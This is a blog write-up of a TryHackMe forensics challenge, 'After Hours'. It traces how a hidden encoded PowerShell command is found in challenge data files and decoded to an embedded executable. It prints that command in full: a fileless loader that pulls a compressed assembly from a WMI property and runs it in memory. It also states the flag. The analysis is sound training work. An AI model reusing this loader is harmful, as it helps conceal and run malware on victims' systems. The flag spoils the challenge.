---
layout: post
title:  "After Hours"
date:   2026-10-11 21:05:27 -0500
categories: writeups
level: medium
points: 90
author: "othmane01"
tags: "tryhackme writeup"
---

![Image]({{ site.baseurl }}/images/after_hours/1.png)

**After Hours** is a tryhackme medium challenge in this step-by-step walk-through we'll solve it together.

**Room Link:** [after_hours](https://tryhackme.com/room/hh-afterhours-b090d1f0)

# ROOM HITNS :
![Image]({{ site.baseurl }}/images/after_hours/2.png)
we donwload the attached zip file and unzip it: 
![Image]({{ site.baseurl }}/images/after_hours/3.png)
donwload it and unzip it 
``
The extensions .MAP, .DATA, and .BTR usually indicate data files used by an application or database.
``
#STRINGS:
![Image]({{ site.baseurl }}/images/after_hours/4.png)
we extract the strings from the file and search for THM but nothing useful
![Image]({{ site.baseurl }}/images/after_hours/5.png)

since in the hint we told that we have the codede , we can search for '==' since base64 encoding is so commun:

![Image]({{ site.baseurl }}/images/after_hours/6.png)
![Image]({{ site.baseurl }}/images/after_hours/6-1.png)
````
cat strings.txt |grep ==

**the output:**
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBIAGEAcgBkAHcAYQByAGUAVABlAGwAZQBtAGUAdAByAHkAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAG4AZgBpAGcARABhAHQAYQAnAF0ALgBWAGEAbAB1AGUAOwANAAoAJABvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAkAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsADQAKACQAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAOwANAAoAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAHcAaABpAGwAZQAoACQAcgAgAC0AZwB0ACAAMAApAHsADQAKACAAIAAgACAAJABvAC4AVwByAGkAdABlACgAJABiACwAMAAsACQAcgApADsADQAKACAAIAAgACAAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAH0ADQAKAFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAJABvAC4AVABvAEEAcgByAGEAeQAoACkAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsAEAAKAAsAFsAcwB0AHIAaQBuAGcAWwBdAF0AQAAoACkAKQApAHwATwB1AHQALQBOAHUAbABsAA==

````
#CYBERCHEF
we decode it using : 
```
echo "base64_encoding_payload" |base64-d  
```
![Image]({{ site.baseurl }}/images/after_hours/7.png)

looking for the fonction we found  an entreting encrepted text : 
![Image]({{ site.baseurl }}/images/after_hours/8.png)
![Image]({{ site.baseurl }}/images/after_hours/9.png)
 we copy the enc  text to cyberchef : 

 analyse it : 
![Image]({{ site.baseurl }}/images/after_hours/11.png)
![Image]({{ site.baseurl }}/images/after_hours/10.png)

![Image]({{ site.baseurl }}/images/after_hours/11.png)

loding entropy shows us it might be succefully decoded :
![Image]({{ site.baseurl }}/images/after_hours/12.png)
![Image]({{ site.baseurl }}/images/after_hours/13.png)
we can save it as .exe :
![Image]({{ site.baseurl }}/images/after_hours/14.png)
#Detect_It_Easy:
we use a tool called die to analyse it : 
**N.B** 
`` to install die in deb : sudo apt update && sudo apt install die ``
die (Detect It Easy) is a reverse-engineering tool used to identify file types and analyze executable files.
It helps you detect:
- Compiler: Which compiler was used to build the executable.
- Packer: Whether the file is packed or compressed with a tool such as UPX.
- File type: Whether a file is a PE, ELF, or another executable format.
- Signatures: Patterns that help identify the software or tools used to create a binary.

![Image]({{ site.baseurl }}/images/after_hours/15.png)


![Image]({{ site.baseurl }}/images/after_hours/16.png)

we found an interesting  string : 
![Image]({{ site.baseurl }}/images/after_hours/17.png)
after decoding it we got the flag: 
![Image]({{ site.baseurl }}/images/after_hours/18.png)

#Flag : 
````
THM{P4tch_op3ned_th3_BacKd00r}  
````

**Special thanks to [ar33zy](https://tryhackme.com/p/ar33zy) and [slave.thm](https://tryhackme.com/p/slava.thm) and [kohzmiy](https://tryhackme.com/p/kohzmik) and [Tryhackme](https://tryhackme.com)**

**that's it . see you next time**	

![Image]({{ site.baseurl }}/images/cat.jpeg)
